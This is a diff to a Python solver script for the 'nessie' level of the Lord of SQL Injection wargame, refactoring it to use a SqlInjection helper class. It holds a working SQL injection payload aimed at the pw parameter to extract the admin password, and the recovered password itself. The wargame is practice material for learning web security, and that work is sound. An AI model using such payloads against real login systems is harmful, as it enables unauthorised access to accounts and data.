@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def main():
@@ -19,19 +20,21 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/nessie_7c5b5d8119ce2951f2a4f2b3a1824dd2.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
+    other_param = {'id': 'admin'}
 
-    param = dict(
-        id='admin', pw="' OR 1=(case when id='admin' then pw else 0 end)--")
-    response = los.get_request(url, param, cook)
+    payload = "' OR 1=(case when id='admin' then pw else 0 end)--"
+    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
+    response = p.my_request()
 
-    print(response)
+    print('\n', response)
 
-    param = dict(pw='uawe0f9ji34fjkl')
-    response = los.get_request(url, param, cook)
-
+    p.payload = 'uawe0f9ji34fjkl'
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Nessie Clear!')
+        print('\nNessie Clear!')
 
 
 if __name__ == '__main__':
